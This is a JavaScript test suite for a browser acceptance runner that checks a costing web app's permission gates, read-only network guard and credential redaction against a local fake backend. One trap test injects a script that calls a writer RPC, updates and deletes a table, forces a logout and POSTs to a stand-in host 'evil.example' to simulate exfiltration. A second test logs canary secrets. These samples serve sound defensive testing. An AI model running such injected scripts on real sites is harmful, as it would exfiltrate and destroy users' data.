// Acceptance runner: fail-closed preconditions, read-only network guard, identity gates, credential hygiene. Real Chromium + a LOCAL fake backend.
// Everything here is LOCAL_SELF_TEST evidence: it proves the RUNNER, not any hosted build. Chromium-dependent tests skip visibly when Playwright is absent.
import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { execFileSync } from "node:child_process";
import { createRequire } from "node:module";
import { fileURLToPath } from "node:url";
import { runAcceptance, MODULES, FLAGS } from "./acceptance-runner.mjs";
import { validateCapturePaths } from "./capture-storage-state.mjs";
import * as S from "./lib/selftest-support.mjs";

const root = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "../..");
const sha = execFileSync("git", ["rev-parse", "HEAD"], { cwd: root }).toString().trim();
let hasPlaywright = true; try { createRequire(import.meta.url)("playwright"); } catch { hasPlaywright = false; }
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "accept-run-"));
let app; test.before(async () => { app = await S.startAppServer(root, sha); });
test.after(async () => { await app?.close(); fs.rmSync(tmp, { recursive: true, force: true }); });
const out = (n) => path.join(tmp, n);
const canon = (rows, n = "canon") => { const f = path.join(tmp, n + ".json"); fs.writeFileSync(f, JSON.stringify({ rows })); return f; };
const hooks = (backend, trapScript) => ({ onContext: S.selfTestContextHook({ backendOrigin: backend.origin, trapScript }) });
const base = (o) => ({ base: app.origin, sha, identity: "ID-V", selfTest: true, matrix: "smoke", ...o });
const browser = (name, fn) => test(name, { skip: hasPlaywright ? false : "Playwright not installed: NOT RUN (a skip is not evidence)" }, fn);

test("static: the runner never clicks, types, submits or presses; it never handles a password; it only selects the period", () => {
  const src = fs.readFileSync(path.join(root, "scripts/costing-acceptance/acceptance-runner.mjs"), "utf8").split("\n").filter((l) => !/^\s*\/\//.test(l)).join("\n");
  assert.doesNotMatch(src, /\.(click|dblclick|fill|press|check|uncheck|tap|dispatchEvent|setInputFiles|dragTo|hover|focus)\(/, "no interaction primitives");
  assert.doesNotMatch(src, /\.type\(\s*[^)\s]/, "no typing (m.type() is the console-message accessor, not typing)");
  assert.doesNotMatch(src, /\.locator\([^)]*\)\.(?!selectOption)/, "locators are used only for selectOption");
  assert.equal([...src.matchAll(/selectOption\(/g)].length, 1, "exactly one interaction: the period selector");
  assert.doesNotMatch(src, /signInWithPassword|grant_type=password|--password|process\.env\.[A-Z_]*PASS|\.fill\(/i, "no password handling (the word appears only in a refusal message)");
  assert.equal(MODULES.reduce((n, m) => n + m.expect, 0), 40, "40 lenses/workspaces"); assert.equal(FLAGS.length, 11);
});
test("static: session capture refuses paths inside the repository and non-https hosts; the repo ignores acceptance output and session files", () => {
  assert.deepEqual(validateCapturePaths({ base: "https://app.example", out: "/somewhere/outside/id-v.json" }), []);
  assert.match(validateCapturePaths({ base: "https://app.example", out: path.join(root, "id-v.storage.json") }).join(), /OUTSIDE the repository/);
  assert.match(validateCapturePaths({ base: "http://app.example", out: "/x/y.json" }).join(), /https/);
  assert.match(validateCapturePaths({ base: "https://app.example" }).join(), /--out is required/);
  for (const f of ["acceptance-2026-11-07/report.json", "id-v.storage-state.json", "id.storage.json"]) execFileSync("git", ["check-ignore", "-q", f], { cwd: root });
});

test("fail closed (no browser): loopback without self-test, hosted without a session, session or output inside the repo, missing canonical proof, bad SHA", async () => {
  const hosted = { base: "https://app.example", sha, identity: "ID-V", canonicalProof: canon([]), out: out("p1") };
  let r = await runAcceptance({ ...hosted, base: app.origin, selfTest: false }); assert.deepEqual([r.exit_code, r.verdict], [2, "USAGE"]); assert.match(r.reasons.join(), /loopback/);
  r = await runAcceptance({ ...hosted }); assert.deepEqual([r.exit_code, r.verdict], [3, "NOT_TESTED"]); assert.match(r.reasons.join(), /no authenticated session/); assert.equal(r.observations.length, 0);
  r = await runAcceptance({ ...hosted, storageState: path.join(root, "package.json") }); assert.match(r.reasons.join(), /inside the repository/);
  const ss = path.join(tmp, "s.json"); fs.writeFileSync(ss, "{}", { mode: 0o644 }); fs.chmodSync(ss, 0o644);
  r = await runAcceptance({ ...hosted, storageState: ss }); assert.match(r.reasons.join(), /readable by group\/others/); fs.chmodSync(ss, 0o600);
  r = await runAcceptance({ ...hosted, storageState: ss, out: path.join(root, "docs/evidence") }); assert.match(r.reasons.join(), /inside the repository and not git-ignored/); assert.ok(!fs.existsSync(path.join(root, "docs/evidence")), "a refused --out is never written to");
  r = await runAcceptance({ ...hosted, storageState: ss, canonicalProof: null }); assert.match(r.reasons.join(), /--canonical-proof is required/);
  r = await runAcceptance({ ...hosted, sha: "main" }); assert.equal(r.exit_code, 2); r = await runAcceptance({ ...hosted, base: "http://app.example" }); assert.equal(r.exit_code, 2);
  assert.ok(fs.existsSync(out("p1") + "/report.json") && JSON.parse(fs.readFileSync(out("p1") + "/report.json", "utf8")).verdict === "USAGE", "even refusals leave a truthful report");
});
test("fail closed: an unreachable or unverifiable build is NOT_TESTED and no browser page is ever opened", async () => {
  const be = await S.startFakeBackend();
  const closed = await new Promise((res) => { const s = (async () => { const http = await import("node:http"); const sv = http.createServer(); sv.listen(0, "127.0.0.1", () => { const p = sv.address().port; sv.close(() => res("http://127.0.0.1:" + p)); }); })(); });
  const r = await runAcceptance(base({ base: closed, canonicalProof: canon(S.viewOnlyRows()), out: out("p2"), backendOrigin: be.origin, testHooks: hooks(be) }));
  assert.deepEqual([r.exit_code, r.verdict], [3, "SELF_TEST_NOT_TESTED"]); assert.match(r.reasons.join(), /build not verified/); assert.equal(r.observations.length, 0); assert.deepEqual(be.seen, [], "the backend was never contacted");
  await be.close();
});
test("fail closed: a stale, mismatched or hosted-class proof file is refused", async () => {
  const be = await S.startFakeBackend();
  const good = { kind: "BUILD_VERIFICATION", verdict: "VERIFIED", git_sha: sha, origin: app.origin, evidence_class: "LOCAL_SELF_TEST", mismatches: 0, checked_at: new Date().toISOString() };
  for (const [name, over] of [["other sha", { git_sha: "1".repeat(40) }], ["other origin", { origin: "http://127.0.0.1:1" }], ["mismatches", { mismatches: 3 }], ["not verified", { verdict: "MISMATCH" }], ["stale", { checked_at: new Date(Date.now() - 48 * 3600e3).toISOString() }], ["wrong class", { evidence_class: "HOSTED" }]]) {
    const f = path.join(tmp, "proof.json"); fs.writeFileSync(f, JSON.stringify({ ...good, ...over }));
    const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("p3"), buildProof: f, backendOrigin: be.origin, testHooks: hooks(be) })); assert.equal(r.exit_code, 3, name); assert.match(r.reasons.join(), /--build-proof does not prove/, name);
  }
  await be.close();
});

browser("fail closed: a tampered served build stops the run before any browser or backend activity", async () => {
  const f = path.join(app.dir, "public/shared/js/costing-feature-flags.js"); const orig = fs.readFileSync(f); const be = await S.startFakeBackend();
  try { fs.writeFileSync(f, Buffer.concat([orig, Buffer.from("\n// tampered\n")]));
    const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("b1"), backendOrigin: be.origin, testHooks: hooks(be) }));
    assert.equal(r.exit_code, 3); assert.match(r.reasons.join(), /build not verified \(MISMATCH\)/); assert.equal(r.observations.length, 0); assert.deepEqual(be.seen, []);
  } finally { fs.writeFileSync(f, orig); await be.close(); }
});
browser("fail closed: identity with ANY edit grant, a mismatch with the canonical extract, a missing target, or a different user is NOT_TESTED and no module is exercised", async () => {
  const run = async (permissions, canonicalRows, extra = {}) => { const be = await S.startFakeBackend({ permissions }); try { return await runAcceptance(base({ canonicalProof: canon(canonicalRows), out: out("i" + Math.random()), backendOrigin: be.origin, testHooks: hooks(be), ...extra })); } finally { await be.close(); } };
  const V = S.viewOnlyRows(); const withEdit = V.map((r, i) => (i ? r : { ...r, can_edit: true }));
  for (const [name, perms, canonRows, re] of [["edit grant in session", withEdit, withEdit, /edit grants/], ["edit grant only in session", withEdit, V, /disagree|edit grants/], ["unrelated edit grant", [...V, { target: "module:x", can_view: true, can_edit: true }], [...V, { target: "module:x", can_view: true, can_edit: true }], /edit grants/],
    ["canonical disagrees", V, V.slice(0, 5), /disagree/], ["target missing", V.slice(1), V.slice(1), /not can_view=true/], ["no permissions at all", [], [], /not can_view=true/]]) {
    const r = await run(perms, canonRows); assert.equal(r.exit_code, 3, name); assert.equal(r.verdict, "SELF_TEST_NOT_TESTED", name); assert.match(r.reasons.join(), re, name); assert.equal(r.observations.length, 0, name + ": nothing exercised"); assert.equal(r.identity.ok, false);
  }
  const be = await S.startFakeBackend(); const f = path.join(tmp, "other-user.json"); fs.writeFileSync(f, JSON.stringify({ rows: V, user_id_sha256_12: "000000000000" }));
  const r = await runAcceptance(base({ canonicalProof: f, out: out("i-other"), backendOrigin: be.origin, testHooks: hooks(be) })); assert.match(r.reasons.join(), /different user/); await be.close();
});
browser("happy path (ID-V, smoke): identity proven, flags set and restored, only reads reach the backend, verdict is SELF_TEST and hosted claims are NOT TESTED", async () => {
  const be = await S.startFakeBackend();
  const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("h1"), backendOrigin: be.origin, testHooks: hooks(be), screenshots: true }));
  assert.equal(r.evidence_class, "LOCAL_SELF_TEST"); assert.equal(r.hosted_claims, "NOT TESTED"); assert.match(r.verdict, /^SELF_TEST_/); assert.equal(r.identity.ok, true); assert.equal(r.flags_restored, true);
  assert.equal(r.violations.length, 0); assert.ok(r.observations.length >= 2); assert.ok(r.observations.every((o) => o.claims.host === "NOT TESTED" && o.claims.flag === "PASS" && o.claims.module === "PASS" && o.claims.render === "PASS"));
  assert.ok(r.observations.every((o) => String(o.claims.data).startsWith("NOT TESTED")), "empty tables are NOT a pass");
  assert.ok(be.seen.every((x) => x.method === "GET" || x.path.startsWith("/rest/v1/rpc/")), "only GETs and RPC POSTs reached the backend");
  assert.ok(be.seen.filter((x) => x.path.includes("/rpc/")).every((x) => /\/rpc\/(get_user_permissions|rpc_get_|rpc_costing_health_check)/.test(x.path)), "only read RPCs: " + JSON.stringify([...new Set(be.seen.map((x) => x.path))].filter((p) => p.includes("/rpc/"))));
  const md = fs.readFileSync(out("h1") + "/report.md", "utf8"); assert.match(md, /Evidence class: LOCAL_SELF_TEST/); assert.match(md, /NOT acceptance evidence for any hosted build/); assert.match(md, /closes no work pack/);
  assert.ok(fs.readdirSync(out("h1") + "/shots").length >= 2, "screenshots written to the out dir");
  await be.close();
});
browser("view-only check (LOCK-P01 regression, post PR #212): with every flag ON the shipped lock screen shows NO enabled mutating control to ID-V; the read RPC is still reported for read-back", async () => {
  // Previously this test asserted the pre-#212 defect (an enabled "Close quarter" button for a CCC view-only identity under COSTING_LOCK_SCREEN_V1).
  // #212 (83b217be) made the lock UI fail-closed on canEdit; the unmodified shipped source therefore yields zero WRITE_CONTROL_ENABLED findings.
  // LOCAL_SELF_TEST evidence only: it proves the current source + runner, not any hosted build or real identity.
  const be = await S.startFakeBackend();
  const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("w1"), backendOrigin: be.origin, testHooks: hooks(be) }));
  const f = r.findings.filter((x) => x.type === "WRITE_CONTROL_ENABLED"); assert.deepEqual(f, [], "no enabled mutating control for view-only: " + JSON.stringify(f));
  assert.ok(!r.observations.some((o) => o.claims.security === "FAIL"), "no per-lens security FAIL for view-only");
  assert.ok(!be.seen.some((x) => x.method !== "GET" && !x.path.includes("/rpc/")), "no non-read request reached the backend");
  const hc = r.findings.find((x) => x.type === "APP_READ_RPC_UNVERIFIED_SERVER_SIDE"); assert.ok(hc && hc.name === "rpc_costing_health_check", "the app-documented read RPC is allowed but reported for read-back");
  await be.close();
});
browser("view-only check (detector kept honest): an INJECTED visible, enabled mutating control for ID-V is still a FINDING (observed, never clicked)", async () => {
  const be = await S.startFakeBackend();
  const inject = `window.addEventListener("load", () => setTimeout(() => { const b = document.createElement("button"); b.textContent = "Close quarter (lock months)"; document.body.appendChild(b); }, 200));`;
  const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("w2"), backendOrigin: be.origin, testHooks: hooks(be, inject) }));
  const f = r.findings.filter((x) => x.type === "WRITE_CONTROL_ENABLED"); assert.ok(f.length >= 1, JSON.stringify(r.findings));
  assert.ok(f.some((x) => x.controls.some((c) => /close quarter/i.test(c)))); assert.equal(r.verdict, "SELF_TEST_COMPLETED_WITH_FINDINGS"); assert.ok(r.observations.some((o) => o.claims.security === "FAIL"));
  assert.ok(!be.seen.some((x) => x.method !== "GET" && !x.path.includes("/rpc/")), "observing the control did not click it");
  await be.close();
});
browser("ID-N: no Costing permission; data visible to ID-N would FAIL; module chrome alone is not a pass", async () => {
  const be = await S.startFakeBackend({ permissions: [] });
  const r = await runAcceptance(base({ identity: "ID-N", canonicalProof: canon([]), out: out("n1"), backendOrigin: be.origin, testHooks: hooks(be) }));
  assert.equal(r.identity.ok, true); assert.ok(r.observations.every((o) => o.claims.data === "PASS (denied)" || o.claims.data.startsWith("FAIL"))); assert.equal(r.violations.length, 0);
  await be.close();
});
browser("TRAP: attempts to call a writer RPC, PATCH/DELETE a table, log out and exfiltrate are ABORTED before the network, recorded, and fail the run (exit 4); the backend sees none of them", async () => {
  const be = await S.startFakeBackend();
  const trap = `window.addEventListener("load", () => setTimeout(async () => { try { const m = await import("/shared/js/supabaseClient.js");
    m.supabase.rpc("rpc_costing_approve_run", { p: 1 }); m.supabase.from("costing_refresh_run").update({ x: 1 }); m.supabase.from("costing_refresh_run").delete();
    fetch(${JSON.stringify(be.origin)} + "/auth/v1/logout", { method: "POST" }).catch(() => {}); fetch("https://evil.example/collect", { method: "POST", body: "x" }).catch(() => {}); } catch (e) {} }, 400));`;
  const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("t1"), backendOrigin: be.origin, testHooks: hooks(be, trap) }));
  assert.equal(r.exit_code, 4, JSON.stringify(r.reasons)); assert.equal(r.verdict, "SELF_TEST_FAILED_SECURITY");
  const kinds = new Set(r.violations.filter((v) => v.class === "VIOLATION").map((v) => v.kind)); for (const k of ["rpc-denied", "rest-write", "backend-denied"]) assert.ok(kinds.has(k), "recorded " + k + " in " + [...kinds]);
  assert.ok(r.violations.some((v) => v.name === "rpc_costing_approve_run" && v.where.module === "costing-control-center" && v.where.lens), "violations say where they came from (here: the identity-proof page)");
  const bad = be.seen.filter((x) => x.path.includes("approve") || x.path.includes("logout") || (x.method !== "GET" && !x.path.includes("get_user_permissions") && !x.path.includes("rpc_get_") && !x.path.includes("health_check")));
  assert.deepEqual(bad, [], "NOTHING mutating reached the backend: " + JSON.stringify(bad));
  assert.ok(r.observations.length < 4, "the run stopped at the first violation");
  await be.close();
});
browser("credential hygiene: a page that logs the token, email, user id and API key leaves NONE of them in report.json or report.md", async () => {
  const be = await S.startFakeBackend();
  const leak = `window.addEventListener("load", () => setTimeout(() => { console.error("session ${S.CANARY_TOKEN} user ${S.CANARY_EMAIL} id ${S.CANARY_UID} apikey=CANARY-ANON-KEY Authorization: Bearer ${S.CANARY_TOKEN}"); throw new Error("boom ${S.CANARY_EMAIL} ${S.CANARY_TOKEN}"); }, 300));`;
  const r = await runAcceptance(base({ canonicalProof: canon(S.viewOnlyRows()), out: out("c1"), backendOrigin: be.origin, testHooks: hooks(be, leak) }));
  assert.ok(r.observations.some((o) => o.console_errors.length), "the page errors were captured (redacted)");
  for (const f of ["report.json", "report.md"]) { const t = fs.readFileSync(path.join(out("c1"), f), "utf8"); for (const secret of [S.CANARY_TOKEN, "CANARY-TOKEN", S.CANARY_EMAIL, S.CANARY_UID, "CANARY-ANON-KEY", "eyJhbGciOiJIUzI1NiJ9", "SIGNATURE-CANARY"]) assert.ok(!t.includes(secret), `${f} leaked ${secret}`); }
  assert.match(r.identity.user_ref, /^[0-9a-f]{12}$/, "only a 12-hex hash of the user id is recorded");
  await be.close();
});
